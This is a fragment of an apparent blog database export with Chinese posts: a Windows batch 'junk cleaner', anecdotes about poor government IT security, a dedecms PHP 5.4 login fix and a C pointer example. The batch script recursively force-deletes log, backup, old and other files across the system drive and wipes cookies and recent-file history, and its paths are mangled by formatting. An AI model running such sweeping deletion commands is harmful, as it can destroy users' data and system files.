⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙ —————————————-DIY:key1088——&amp;#160;&amp;#160; ⊙<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo 按任意键开始工作<br />pause&gt;nul<br />cls<br />RD %windir%$hf_mig$ &#x2F;Q &#x2F;S<br /><br />dir %windir%$NtUninstall* &#x2F;a:d &#x2F;b &gt;%windir%2950800.txt<br /><br />for &#x2F;f %%i in (%windir%2950800.txt) do rd %windir%%%i &#x2F;s &#x2F;q<br /><br />del %windir%2950800.txt &#x2F;f &#x2F;q<br /><br />del %windir%KB*.log &#x2F;f &#x2F;q<br /><br />del &#x2F;f &#x2F;s &#x2F;q %systemdrive%<em>.tmp<br /><br />del &#x2F;f &#x2F;s &#x2F;q %systemdrive%</em>._mp<br /><br />del &#x2F;f &#x2F;s &#x2F;q %systemdrive%<em>.log<br /><br />del &#x2F;f &#x2F;s &#x2F;q %systemdrive%</em>.gid<br /><br />del &#x2F;f &#x2F;s &#x2F;q %systemdrive%<em>.chk<br /><br />del &#x2F;f &#x2F;s &#x2F;q %systemdrive%</em>.old<br /><br />del &#x2F;f &#x2F;s &#x2F;q %systemdrive%recycled*.<em><br /><br />del &#x2F;f &#x2F;s &#x2F;q %windir%</em>.bak<br /><br />del &#x2F;f &#x2F;s &#x2F;q %windir%prefetch*.<em><br /><br />rd &#x2F;s &#x2F;q %windir%temp &amp; md %windir%temp<br /><br />del &#x2F;f &#x2F;q %userprofile%cookies</em>.<em><br /><br />del &#x2F;f &#x2F;s &#x2F;q &quot;%userprofile%local settingstemporary internet files</em>.<em>&quot;<br /><br />del &#x2F;f &#x2F;s &#x2F;q &quot;%userprofile%local settingstemp</em>.<em>&quot;<br /><br />del &#x2F;f &#x2F;s &#x2F;q &quot;%userprofile%recent</em>.*&quot;<br />color 27<br />cls<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo ⊙&amp;#160;&amp;#160; 欢迎使用由&quot;key1088&quot;制作的清除系统垃圾文件批处理小程序&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 清除系统垃圾文件批处理系统，执行完毕&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 好好学习，天天向上&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 谢谢使用!&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; ⊙<br />echo ⊙ —————————————-DIY:key1088——&amp;#160;&amp;#160; ⊙<br />echo ⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙⊙<br />echo 5秒后自动退住<br />ping &#x2F;n 5 127.0.0.1&gt;nul<br /><br /><br />复制下来，保存为.BAT 结尾的文件。。</p>\n"},{"title":"经典N个","date":"2010-06-26T05:12:00.000Z","_content":"<p>某业内人士 10:06:01<br />有些zf技术人员水平差的无法理解，说说我以前遇到过的一次：</p><p>某单位网站服务器被黑了，他打电话求助别人帮他改了密码，然后登录，我看他老把密码输入在用户名处登不进，我很纳闷这是干什么？我也没提醒他，过了 好久他不得不向我求助说进不了，然后我教他用户名处输入用户名，密码处输入密码，他感谢我说又学了一个技巧。我很纳闷，问他你在这做网管做多久了，他说做 了有五年了。我看他桌子上还摆了一大堆的技术书籍。</p><p>其实这样的事情数不胜数，跟朋友闲聊得知有很多类似荒诞的事让人抓狂：</p><p>朋友给一家zf单位做安全检查和加固，发现所有主机管理员密码全部是123456，叫技术人员们改密码，他们很怀疑的眼光说，密码没告诉别人，黑客 怎么能知道？朋友解释这个密码太简单，靠手工猜测就能猜出来，他说黑客哪有可能偏会猜这个呢？然后又解释一堆，说黑客字典里都有这个密码，他还是不理解， 怎么会有？我没告诉他们啊，怎么黑客字典里都有呢！%￥(&amp;^&amp;</p><p>然后给的安全解决方案其中一项就是改密码。数日后，zf技术人员打来电话，问&ldquo;怎么这么久你还没给我改密码，我要投诉你！&rdquo;然后又解释了一大堆，密 码是他们自己内部改，让他改他就知道了！他还是不理解，你们不是做安全的么，密码不由你们改谁改？^%&amp;%^$&amp;^%</p><p>还有的技术人员也不是不懂技术：<br />某地做安全检查，朋友检查发现木马要把木马清掉，负责人说不要清掉!你清掉了，黑客进不来他们万一采取更大的报复怎么办？无语。。。</p><p>某业内人士&nbsp;&nbsp;  11:43:44<br />有的黑客也经典</p><p>某业内人士 11:44:31<br />某地发生DoS攻击，我去应急，黑客打来电话，逼要系统密码，否则就一直DoS<br />某业内人士 11:44:46<br />我和客户都哭笑不得</p>","source":"_posts/经典N个.md","raw":"title: 经典N个\ncategories: [生活感想]\ntags: []\ndate: 2010-06-26 13:12:00\n---\n<p>某业内人士 10:06:01<br />有些zf技术人员水平差的无法理解，说说我以前遇到过的一次：</p><p>某单位网站服务器被黑了，他打电话求助别人帮他改了密码，然后登录，我看他老把密码输入在用户名处登不进，我很纳闷这是干什么？我也没提醒他，过了 好久他不得不向我求助说进不了，然后我教他用户名处输入用户名，密码处输入密码，他感谢我说又学了一个技巧。我很纳闷，问他你在这做网管做多久了，他说做 了有五年了。我看他桌子上还摆了一大堆的技术书籍。</p><p>其实这样的事情数不胜数，跟朋友闲聊得知有很多类似荒诞的事让人抓狂：</p><p>朋友给一家zf单位做安全检查和加固，发现所有主机管理员密码全部是123456，叫技术人员们改密码，他们很怀疑的眼光说，密码没告诉别人，黑客 怎么能知道？朋友解释这个密码太简单，靠手工猜测就能猜出来，他说黑客哪有可能偏会猜这个呢？然后又解释一堆，说黑客字典里都有这个密码，他还是不理解， 怎么会有？我没告诉他们啊，怎么黑客字典里都有呢！%￥(&amp;^&amp;</p><p>然后给的安全解决方案其中一项就是改密码。数日后，zf技术人员打来电话，问&ldquo;怎么这么久你还没给我改密码，我要投诉你！&rdquo;然后又解释了一大堆，密 码是他们自己内部改，让他改他就知道了！他还是不理解，你们不是做安全的么，密码不由你们改谁改？^%&amp;%^$&amp;^%</p><p>还有的技术人员也不是不懂技术：<br />某地做安全检查，朋友检查发现木马要把木马清掉，负责人说不要清掉!你清掉了，黑客进不来他们万一采取更大的报复怎么办？无语。。。</p><p>某业内人士&nbsp;&nbsp;  11:43:44<br />有的黑客也经典</p><p>某业内人士 11:44:31<br />某地发生DoS攻击，我去应急，黑客打来电话，逼要系统密码，否则就一直DoS<br />某业内人士 11:44:46<br />我和客户都哭笑不得</p>","slug":"经典N个","published":1,"updated":"2023-04-22T05:38:45.128Z","_id":"clgrjlxjy00817opigzwj0g9t","comments":1,"layout":"post","photos":[],"link":"","content":"<p>某业内人士 10:06:01<br />有些zf技术人员水平差的无法理解，说说我以前遇到过的一次：</p><p>某单位网站服务器被黑了，他打电话求助别人帮他改了密码，然后登录，我看他老把密码输入在用户名处登不进，我很纳闷这是干什么？我也没提醒他，过了 好久他不得不向我求助说进不了，然后我教他用户名处输入用户名，密码处输入密码，他感谢我说又学了一个技巧。我很纳闷，问他你在这做网管做多久了，他说做 了有五年了。我看他桌子上还摆了一大堆的技术书籍。</p><p>其实这样的事情数不胜数，跟朋友闲聊得知有很多类似荒诞的事让人抓狂：</p><p>朋友给一家zf单位做安全检查和加固，发现所有主机管理员密码全部是123456，叫技术人员们改密码，他们很怀疑的眼光说，密码没告诉别人，黑客 怎么能知道？朋友解释这个密码太简单，靠手工猜测就能猜出来，他说黑客哪有可能偏会猜这个呢？然后又解释一堆，说黑客字典里都有这个密码，他还是不理解， 怎么会有？我没告诉他们啊，怎么黑客字典里都有呢！%￥(&amp;^&amp;</p><p>然后给的安全解决方案其中一项就是改密码。数日后，zf技术人员打来电话，问&ldquo;怎么这么久你还没给我改密码，我要投诉你！&rdquo;然后又解释了一大堆，密 码是他们自己内部改，让他改他就知道了！他还是不理解，你们不是做安全的么，密码不由你们改谁改？^%&amp;%^$&amp;^%</p><p>还有的技术人员也不是不懂技术：<br />某地做安全检查，朋友检查发现木马要把木马清掉，负责人说不要清掉!你清掉了，黑客进不来他们万一采取更大的报复怎么办？无语。。。</p><p>某业内人士&nbsp;&nbsp;  11:43:44<br />有的黑客也经典</p><p>某业内人士 11:44:31<br />某地发生DoS攻击，我去应急，黑客打来电话，逼要系统密码，否则就一直DoS<br />某业内人士 11:44:46<br />我和客户都哭笑不得</p>","site":{"data":{}},"excerpt":"","more":"<p>某业内人士 10:06:01<br />有些zf技术人员水平差的无法理解，说说我以前遇到过的一次：</p><p>某单位网站服务器被黑了，他打电话求助别人帮他改了密码，然后登录，我看他老把密码输入在用户名处登不进，我很纳闷这是干什么？我也没提醒他，过了 好久他不得不向我求助说进不了，然后我教他用户名处输入用户名，密码处输入密码，他感谢我说又学了一个技巧。我很纳闷，问他你在这做网管做多久了，他说做 了有五年了。我看他桌子上还摆了一大堆的技术书籍。</p><p>其实这样的事情数不胜数，跟朋友闲聊得知有很多类似荒诞的事让人抓狂：</p><p>朋友给一家zf单位做安全检查和加固，发现所有主机管理员密码全部是123456，叫技术人员们改密码，他们很怀疑的眼光说，密码没告诉别人，黑客 怎么能知道？朋友解释这个密码太简单，靠手工猜测就能猜出来，他说黑客哪有可能偏会猜这个呢？然后又解释一堆，说黑客字典里都有这个密码，他还是不理解， 怎么会有？我没告诉他们啊，怎么黑客字典里都有呢！%￥(&amp;^&amp;</p><p>然后给的安全解决方案其中一项就是改密码。数日后，zf技术人员打来电话，问&ldquo;怎么这么久你还没给我改密码，我要投诉你！&rdquo;然后又解释了一大堆，密 码是他们自己内部改，让他改他就知道了！他还是不理解，你们不是做安全的么，密码不由你们改谁改？^%&amp;%^$&amp;^%</p><p>还有的技术人员也不是不懂技术：<br />某地做安全检查，朋友检查发现木马要把木马清掉，负责人说不要清掉!你清掉了，黑客进不来他们万一采取更大的报复怎么办？无语。。。</p><p>某业内人士&nbsp;&nbsp;  11:43:44<br />有的黑客也经典</p><p>某业内人士 11:44:31<br />某地发生DoS攻击，我去应急，黑客打来电话，逼要系统密码，否则就一直DoS<br />某业内人士 11:44:46<br />我和客户都哭笑不得</p>"},{"title":"解决dedecms在php高版本中不兼容登录的问题","date":"2013-04-13T04:41:45.000Z","_content":"帮gf把网站给迁移的时候,因为php版本比较高,导致登录的时候不能访问后台,只返回空页面,高版本不兼容,郁闷。wordpress做的挺好,主流兼容性比较好.\n百度之,搜了一下解决的方法,原来是一个函数的问题,下面是解决的方法。\n登陆dedemcs后台输入用户名和密码后没有提示显示为空白，主要原为是php5.4的版本废除了session_register函数\n可以采用如$_SESSION[$this->keepUserIDTag] = $this->userID; 这种方式处理完整代码如下\n首先打开 include/userlogin.class.php这个文件，在287行到308行原内容如下：\n<pre>\n@session_register($this->keepUserIDTag);\n$_SESSION[$this->keepUserIDTag] = $this->userID;\n@session_register($this->keepUserTypeTag);\n$_SESSION[$this->keepUserTypeTag] = $this->userType;\n@session_register($this->keepUserChannelTag);\n$_SESSION[$this->keepUserChannelTag] = $this->userChannel;\n@session_register($this->keepUserNameTag);\n$_SESSION[$this->keepUserNameTag] = $this->userName;\n@session_register($this->keepUserPurviewTag);\n$_SESSION[$this->keepUserPurviewTag] = $this->userPurview;\n@session_register($this->keepAdminStyleTag);\n$_SESSION[$this->keepAdminStyleTag] = $adminstyle;\nPutCookie(‘DedeUserID’, $this->userID, 3600 * 24, ‘/’);\nPutCookie(‘DedeLoginTime’, time(), 3600 * 24, ‘/’);\n</pre>\n替换成\n<pre>\nglobal $admincachefile,$adminstyle;\nif(empty($adminstyle)) $adminstyle = ‘dedecms’;\n//@session_register($this->keepUserIDTag);\n$_SESSION[$this->keepUserIDTag] = $this->keepUserIDTag;\n$_SESSION[$this->keepUserIDTag] = $this->userID;\n//@session_register($this->keepUserTypeTag);\n$_SESSION[$this->keepUserTypeTag] = $this->keepUserTypeTag;\n$_SESSION[$this->keepUserTypeTag] = $this->userType;\n// @session_register($this->keepUserChannelTag);\n$_SESSION[$this->keepUserChannelTag] = $this->keepUserChannelTag;\n$_SESSION[$this->keepUserChannelTag] = $this->userChannel;\n//@session_register($this->keepUserNameTag);\n$_SESSION[$this->keepUserNameTag] = $this->keepUserNameTag;\n$_SESSION[$this->keepUserNameTag] = $this->userName;\n//@session_register($this->keepUserPurviewTag);\n$_SESSION[$this->keepUserPurviewTag] = $this->keepUserPurviewTag;\n$_SESSION[$this->keepUserPurviewTag] = $this->userPurview;\n// @session_register($this->keepAdminStyleTag);\n$_SESSION[$this->keepAdminStyleTag] = $this->keepAdminStyleTag;\n$_SESSION[$this->keepAdminStyleTag] = $adminstyle;\nPutCookie(‘DedeUserID’, $this->userID, 3600 * 24, ‘/’);\nPutCookie(‘DedeLoginTime’, time(), 3600 * 24, ‘/’);\n</pre>","source":"_posts/解决dedecms在php高版本中不兼容登录的问题.md","raw":"title: 解决dedecms在php高版本中不兼容登录的问题\ncategories: [Php编程]\ntags: []\ndate: 2013-04-13 12:41:45\n---\n帮gf把网站给迁移的时候,因为php版本比较高,导致登录的时候不能访问后台,只返回空页面,高版本不兼容,郁闷。wordpress做的挺好,主流兼容性比较好.\n百度之,搜了一下解决的方法,原来是一个函数的问题,下面是解决的方法。\n登陆dedemcs后台输入用户名和密码后没有提示显示为空白，主要原为是php5.4的版本废除了session_register函数\n可以采用如$_SESSION[$this->keepUserIDTag] = $this->userID; 这种方式处理完整代码如下\n首先打开 include/userlogin.class.php这个文件，在287行到308行原内容如下：\n<pre>\n@session_register($this->keepUserIDTag);\n$_SESSION[$this->keepUserIDTag] = $this->userID;\n@session_register($this->keepUserTypeTag);\n$_SESSION[$this->keepUserTypeTag] = $this->userType;\n@session_register($this->keepUserChannelTag);\n$_SESSION[$this->keepUserChannelTag] = $this->userChannel;\n@session_register($this->keepUserNameTag);\n$_SESSION[$this->keepUserNameTag] = $this->userName;\n@session_register($this->keepUserPurviewTag);\n$_SESSION[$this->keepUserPurviewTag] = $this->userPurview;\n@session_register($this->keepAdminStyleTag);\n$_SESSION[$this->keepAdminStyleTag] = $adminstyle;\nPutCookie(‘DedeUserID’, $this->userID, 3600 * 24, ‘/’);\nPutCookie(‘DedeLoginTime’, time(), 3600 * 24, ‘/’);\n</pre>\n替换成\n<pre>\nglobal $admincachefile,$adminstyle;\nif(empty($adminstyle)) $adminstyle = ‘dedecms’;\n//@session_register($this->keepUserIDTag);\n$_SESSION[$this->keepUserIDTag] = $this->keepUserIDTag;\n$_SESSION[$this->keepUserIDTag] = $this->userID;\n//@session_register($this->keepUserTypeTag);\n$_SESSION[$this->keepUserTypeTag] = $this->keepUserTypeTag;\n$_SESSION[$this->keepUserTypeTag] = $this->userType;\n// @session_register($this->keepUserChannelTag);\n$_SESSION[$this->keepUserChannelTag] = $this->keepUserChannelTag;\n$_SESSION[$this->keepUserChannelTag] = $this->userChannel;\n//@session_register($this->keepUserNameTag);\n$_SESSION[$this->keepUserNameTag] = $this->keepUserNameTag;\n$_SESSION[$this->keepUserNameTag] = $this->userName;\n//@session_register($this->keepUserPurviewTag);\n$_SESSION[$this->keepUserPurviewTag] = $this->keepUserPurviewTag;\n$_SESSION[$this->keepUserPurviewTag] = $this->userPurview;\n// @session_register($this->keepAdminStyleTag);\n$_SESSION[$this->keepAdminStyleTag] = $this->keepAdminStyleTag;\n$_SESSION[$this->keepAdminStyleTag] = $adminstyle;\nPutCookie(‘DedeUserID’, $this->userID, 3600 * 24, ‘/’);\nPutCookie(‘DedeLoginTime’, time(), 3600 * 24, ‘/’);\n</pre>","slug":"解决dedecms在php高版本中不兼容登录的问题","published":1,"updated":"2023-04-22T05:38:45.151Z","_id":"clgrjlxjz00837opieozsgxm8","comments":1,"layout":"post","photos":[],"link":"","content":"<p>帮gf把网站给迁移的时候,因为php版本比较高,导致登录的时候不能访问后台,只返回空页面,高版本不兼容,郁闷。wordpress做的挺好,主流兼容性比较好.<br>百度之,搜了一下解决的方法,原来是一个函数的问题,下面是解决的方法。<br>登陆dedemcs后台输入用户名和密码后没有提示显示为空白，主要原为是php5.4的版本废除了session_register函数<br>可以采用如$_SESSION[$this-&gt;keepUserIDTag] &#x3D; $this-&gt;userID; 这种方式处理完整代码如下<br>首先打开 include&#x2F;userlogin.class.php这个文件，在287行到308行原内容如下：</p>\n<pre>\n@session_register($this->keepUserIDTag);\n$_SESSION[$this->keepUserIDTag] = $this->userID;\n@session_register($this->keepUserTypeTag);\n$_SESSION[$this->keepUserTypeTag] = $this->userType;\n@session_register($this->keepUserChannelTag);\n$_SESSION[$this->keepUserChannelTag] = $this->userChannel;\n@session_register($this->keepUserNameTag);\n$_SESSION[$this->keepUserNameTag] = $this->userName;\n@session_register($this->keepUserPurviewTag);\n$_SESSION[$this->keepUserPurviewTag] = $this->userPurview;\n@session_register($this->keepAdminStyleTag);\n$_SESSION[$this->keepAdminStyleTag] = $adminstyle;\nPutCookie(‘DedeUserID’, $this->userID, 3600 * 24, ‘/’);\nPutCookie(‘DedeLoginTime’, time(), 3600 * 24, ‘/’);\n</pre>\n<p>替换成</p>\n<pre>\nglobal $admincachefile,$adminstyle;\nif(empty($adminstyle)) $adminstyle = ‘dedecms’;\n//@session_register($this->keepUserIDTag);\n$_SESSION[$this->keepUserIDTag] = $this->keepUserIDTag;\n$_SESSION[$this->keepUserIDTag] = $this->userID;\n//@session_register($this->keepUserTypeTag);\n$_SESSION[$this->keepUserTypeTag] = $this->keepUserTypeTag;\n$_SESSION[$this->keepUserTypeTag] = $this->userType;\n// @session_register($this->keepUserChannelTag);\n$_SESSION[$this->keepUserChannelTag] = $this->keepUserChannelTag;\n$_SESSION[$this->keepUserChannelTag] = $this->userChannel;\n//@session_register($this->keepUserNameTag);\n$_SESSION[$this->keepUserNameTag] = $this->keepUserNameTag;\n$_SESSION[$this->keepUserNameTag] = $this->userName;\n//@session_register($this->keepUserPurviewTag);\n$_SESSION[$this->keepUserPurviewTag] = $this->keepUserPurviewTag;\n$_SESSION[$this->keepUserPurviewTag] = $this->userPurview;\n// @session_register($this->keepAdminStyleTag);\n$_SESSION[$this->keepAdminStyleTag] = $this->keepAdminStyleTag;\n$_SESSION[$this->keepAdminStyleTag] = $adminstyle;\nPutCookie(‘DedeUserID’, $this->userID, 3600 * 24, ‘/’);\nPutCookie(‘DedeLoginTime’, time(), 3600 * 24, ‘/’);\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>帮gf把网站给迁移的时候,因为php版本比较高,导致登录的时候不能访问后台,只返回空页面,高版本不兼容,郁闷。wordpress做的挺好,主流兼容性比较好.<br>百度之,搜了一下解决的方法,原来是一个函数的问题,下面是解决的方法。<br>登陆dedemcs后台输入用户名和密码后没有提示显示为空白，主要原为是php5.4的版本废除了session_register函数<br>可以采用如$_SESSION[$this-&gt;keepUserIDTag] &#x3D; $this-&gt;userID; 这种方式处理完整代码如下<br>首先打开 include&#x2F;userlogin.class.php这个文件，在287行到308行原内容如下：</p>\n<pre>\n@session_register($this->keepUserIDTag);\n$_SESSION[$this->keepUserIDTag] = $this->userID;\n@session_register($this->keepUserTypeTag);\n$_SESSION[$this->keepUserTypeTag] = $this->userType;\n@session_register($this->keepUserChannelTag);\n$_SESSION[$this->keepUserChannelTag] = $this->userChannel;\n@session_register($this->keepUserNameTag);\n$_SESSION[$this->keepUserNameTag] = $this->userName;\n@session_register($this->keepUserPurviewTag);\n$_SESSION[$this->keepUserPurviewTag] = $this->userPurview;\n@session_register($this->keepAdminStyleTag);\n$_SESSION[$this->keepAdminStyleTag] = $adminstyle;\nPutCookie(‘DedeUserID’, $this->userID, 3600 * 24, ‘/’);\nPutCookie(‘DedeLoginTime’, time(), 3600 * 24, ‘/’);\n</pre>\n<p>替换成</p>\n<pre>\nglobal $admincachefile,$adminstyle;\nif(empty($adminstyle)) $adminstyle = ‘dedecms’;\n//@session_register($this->keepUserIDTag);\n$_SESSION[$this->keepUserIDTag] = $this->keepUserIDTag;\n$_SESSION[$this->keepUserIDTag] = $this->userID;\n//@session_register($this->keepUserTypeTag);\n$_SESSION[$this->keepUserTypeTag] = $this->keepUserTypeTag;\n$_SESSION[$this->keepUserTypeTag] = $this->userType;\n// @session_register($this->keepUserChannelTag);\n$_SESSION[$this->keepUserChannelTag] = $this->keepUserChannelTag;\n$_SESSION[$this->keepUserChannelTag] = $this->userChannel;\n//@session_register($this->keepUserNameTag);\n$_SESSION[$this->keepUserNameTag] = $this->keepUserNameTag;\n$_SESSION[$this->keepUserNameTag] = $this->userName;\n//@session_register($this->keepUserPurviewTag);\n$_SESSION[$this->keepUserPurviewTag] = $this->keepUserPurviewTag;\n$_SESSION[$this->keepUserPurviewTag] = $this->userPurview;\n// @session_register($this->keepAdminStyleTag);\n$_SESSION[$this->keepAdminStyleTag] = $this->keepAdminStyleTag;\n$_SESSION[$this->keepAdminStyleTag] = $adminstyle;\nPutCookie(‘DedeUserID’, $this->userID, 3600 * 24, ‘/’);\nPutCookie(‘DedeLoginTime’, time(), 3600 * 24, ‘/’);\n</pre>"},{"title":"结构体数组指针","date":"2013-07-09T14:00:44.000Z","_content":"结构体数组指针有点绕，使用和数组指针一样的\n<pre>\n#include <stdio.h>\n#include <string.h>\ntypedef struct {\n    long int    num;\n    char        name[20];\n    char        sex;\n    float       score;\n} student;\nstudent stu_1[10], *p;\nint main(void) {\n    p = &stu_1;\n    stu_1[1].num = 89101;\n    strcpy(stu_1[1].name, \"LiLin\");\n    p->sex='M';\n    p->score=89.5;\n    printf(\"%ld, %s,%c,%fn\", (p+1)->num, (p+1)->name,stu_1[0].sex,p->score);\n    return 0;\n}\n</pre>","source":"_posts/结构体数组指针.md","raw":"title: 结构体数组指针\ncategories: [C编程]\ntags: []\ndate: 2013-07-09 22:00:44\n---\n结构体数组指针有点绕，使用和数组指针一样的\n<pre>\n#include <stdio.h>\n#include <string.h>\ntypedef struct {\n    long int    num;\n    char        name[20];\n    char        sex;\n    float       score;\n} student;\nstudent stu_1[10], *p;\nint main(void) {\n    p = &stu_1;\n    stu_1[1].num = 89101;\n    strcpy(stu_1[1].name, \"LiLin\");\n    p->sex='M';\n    p->score=89.5;\n    printf(\"%ld, %s,%c,%fn\", (p+1)->num, (p+1)->name,stu_1[0].sex,p->score);\n    return 0;\n}\n</pre>","slug":"结构体数组指针","published":1,"updated":"2023-04-22T05:38:45.131Z","_id":"clgrjlxk100867opic4iq2fyd","comments":1,"layout":"post","photos":[],"link":"","content":"<p>结构体数组指针有点绕，使用和数组指针一样的</p>\n<pre>\n#include <stdio.h>\n#include <string.h>\ntypedef struct {\n    long int    num;\n    char        name[20];\n    char        sex;\n    float       score;\n} student;\nstudent stu_1[10], *p;\nint main(void) {\n    p = &stu_1;\n    stu_1[1].num = 89101;\n    strcpy(stu_1[1].name, \"LiLin\");\n    p->sex='M';\n    p->score=89.5;\n    printf(\"%ld, %s,%c,%fn\", (p+1)->num, (p+1)->name,stu_1[0].sex,p->score);\n    return 0;\n}\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>结构体数组指针有点绕，使用和数组指针一样的</p>\n<pre>\n#include <stdio.h>\n#include <string.h>\ntypedef struct {\n    long int    num;\n    char        name[20];\n    char        sex;\n    float       score;\n} student;\nstudent stu_1[10], *p;\nint main(void) {\n    p = &stu_1;\n    stu_1[1].num = 89101;\n    strcpy(stu_1[1].name, \"LiLin\");\n    p->sex='M';\n    p->score=89.5;\n    printf(\"%ld, %s,%c,%fn\", (p+1)->num, (p+1)->name,stu_1[0].sex,p->score);\n    return 0;\n}\n</pre>"},{"title":"日产警车","date":"2012-09-11T13:54:00.000Z","_content":"<p>日产警车,这种货都有。ZF都是吃屎的啊。<br /></p>","source":"_posts/日产警车.md","raw":"title: 日产警车\ncategories: [生活感想]\ntags: []\ndate: 2012-09-11 21:54:00\n---\n<p>日产警车,这种货都有。ZF都是吃屎的啊。<br 